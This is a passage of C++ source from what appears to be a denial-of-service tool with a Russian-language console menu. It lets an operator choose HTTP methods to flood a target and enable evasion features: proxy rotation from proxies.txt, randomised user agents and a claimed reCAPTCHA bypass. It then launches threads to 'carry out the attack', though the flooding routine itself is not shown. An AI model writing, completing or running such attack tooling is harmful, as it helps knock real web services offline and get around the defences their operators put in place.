         std::cout << static_cast<int>(AttackType::RECAPCHA_BYPASS)
                   << "# Обход Рекапчи" << std::endl;
         std::cout << static_cast<int>(AttackType::EXIT)
                   << "# Закончить выбор и приступить к выполнению атаки"
                   << std::endl;

         int *comand = new int;
         *comand = 0;
         while (*comand != static_cast<int>(AttackType::EXIT)) {
           std::cout << ">>> ";
           std::cin >> *comand;

           if (*comand < static_cast<int>(AttackType::PROXY) ||
               *comand > static_cast<int>(AttackType::EXIT)) {
             do {
               std::cout << "Введены неверные данные! Попробуйте еще раз!"
                         << std::endl;
               std::cout << ">>> ";
               std::cin >> *comand;
             } while (*comand < static_cast<int>(AttackType::PROXY) ||
                      *comand > static_cast<int>(AttackType::EXIT));
           }

           if (*comand == static_cast<int>(AttackType::PROXY)) {
             std::cout << "Отправка запросов через PROXY включена!"
                       << std::endl;
             statistic.isProxy = true;
           } else if (*comand == static_cast<int>(AttackType::USER_AGENT)) {
             std::cout
                 << "Отправка запросов с применением User Agents включена!"
                 << std::endl;
             statistic.isUserAgent = true;
           } else if (*comand ==
                      static_cast<int>(AttackType::RECAPCHA_BYPASS)) {
             std::cout
                 << "Отправка запросов с обходом Рекапчи включена!"
                 << std::endl;
             statistic.isRecapcha = true;
           }
         }
         delete comand;
       }

#if _WIN64
       system("pause");
       system("cls");
       system("color 2");
#endif

       std::thread fone_gang_shit = std::thread(gang_shit);
       std::thread fone_music = std::thread(music);
       std::thread fone_singing_bloknot = std::thread(singing_bloknot);
       fone_gang_shit.join();
       fone_music.join();
       fone_singing_bloknot.join();
     }
   }
#endif

#if unix
   int main() {
       std::srand(std::time(nullptr));
       setlocale(LC_ALL, "rus");

       statistic.isHttp = true;

         if (statistic.isHttp == true) {
           std::cout << "Введите типы запросов которые вы будете "
                        "отправлять:(введите цифру)"
                     << std::endl;
           std::cout << static_cast<int>(HttpResponseType::GET) << "# Get запросы"
                     << std::endl;
           std::cout << static_cast<int>(HttpResponseType::POST)
                     << "# Post запросы" << std::endl;
           std::cout << static_cast<int>(HttpResponseType::PUT) << "# Put запросы"
                     << std::endl;
           std::cout << static_cast<int>(HttpResponseType::r_DELETE)
                     << "# Delete запросы" << std::endl;
           std::cout << static_cast<int>(HttpResponseType::PATCH)
                     << "# Patch запросы" << std::endl;
           std::cout << static_cast<int>(HttpResponseType::EXIT)
                     << "# Закончить выбор и перейти к атаке" << std::endl;

           int *responseType = new int;
           *responseType = 0;

           while (*responseType != static_cast<int>(HttpResponseType::EXIT)) {
             std::cout << ">>> ";
             std::cin >> *responseType;

             if (*responseType < static_cast<int>(HttpResponseType::GET) ||
                 *responseType > static_cast<int>(HttpResponseType::EXIT)) {
               do {
                 std::cout << "Введены неверные символы! Попробуйте еще раз:"
                           << std::endl;
                 std::cout << ">>> ";
                 std::cin >> *responseType;
               } while (*responseType < static_cast<int>(HttpResponseType::GET) ||
                        *responseType > static_cast<int>(HttpResponseType::EXIT));
             }

             switch (*responseType) {
               case static_cast<int>(HttpResponseType::GET):
                 std::cout << "Отправка Get запросов включена!" << std::endl;
                 statistic.isGet = true;
                 break;
               case static_cast<int>(HttpResponseType::POST):
                 std::cout << "Отправка Post запросов включена!" << std::endl;
                 statistic.isPost = true;
                 break;
               case static_cast<int>(HttpResponseType::PUT):
                 std::cout << "Отправка Put запросов включена!" << std::endl;
                 statistic.isPut = true;
                 break;
               case static_cast<int>(HttpResponseType::r_DELETE):
                 std::cout << "Отправка Delete запросов включена!" << std::endl;
                 statistic.isDelete = true;
                 break;
               case static_cast<int>(HttpResponseType::PATCH):
                 std::cout << "Отправка Patch запросов включена!" << std::endl;
                 statistic.isPatch = true;
                 break;
             }
           }

           delete responseType;
         }

         if (statistic.isHttp == true) {

           std::cout << "Введите будете ли вы использовать прокси или юзер "
                        "агенты:(1 или 2)"
                     << std::endl;
           std::cout
               << static_cast<int>(AttackType::PROXY)
               << "# Включить прокси (можете добавить свои в файл proxies.txt)"
               << std::endl;
           std::cout
               << static_cast<int>(AttackType::USER_AGENT)
               << "# Включить Рандомизатор юзер агентов (можете добавить свои в "
                  "файл users.txt)"
               << std::endl;
           std::cout << static_cast<int>(AttackType::RECAPCHA_BYPASS)
                     << "# Обход Рекапчи" << std::endl;
           std::cout << static_cast<int>(AttackType::EXIT)
                     << "# Закончить выбор и приступить к выполнению атаки"
                     << std::endl;

           int *comand = new int;
           *comand = 0;
           while (*comand != static_cast<int>(AttackType::EXIT)) {
             std::cout << ">>> ";
             std::cin >> *comand;

             if (*comand < static_cast<int>(AttackType::PROXY) ||
                 *comand > static_cast<int>(AttackType::EXIT)) {
               do {
                 std::cout << "Введены неверные данные! Попробуйте еще раз!"
                           << std::endl;
                 std::cout << ">>> ";
                 std::cin >> *comand;
               } while (*comand < static_cast<int>(AttackType::PROXY) ||
                        *comand > static_cast<int>(AttackType::EXIT));
             }

             if (*comand == static_cast<int>(AttackType::PROXY)) {
               std::cout << "Отправка запросов через PROXY включена!"
                         << std::endl;
               statistic.isProxy = true;
             } else if (*comand == static_cast<int>(AttackType::USER_AGENT)) {
               std::cout
                   << "Отправка запросов с применением User Agents включена!"
                   << std::endl;
               statistic.isUserAgent = true;
             } else if (*comand ==
                        static_cast<int>(AttackType::RECAPCHA_BYPASS)) {
               std::cout
                   << "Отправка запросов с обходом Рекапчи включена!"
                   << std::endl;
               statistic.isRecapcha = true;
             }
           }
           delete comand;
         }

         std::thread fone_gang_shit = std::thread(gang_shit);
         fone_gang_shit.join();
   }
#endif
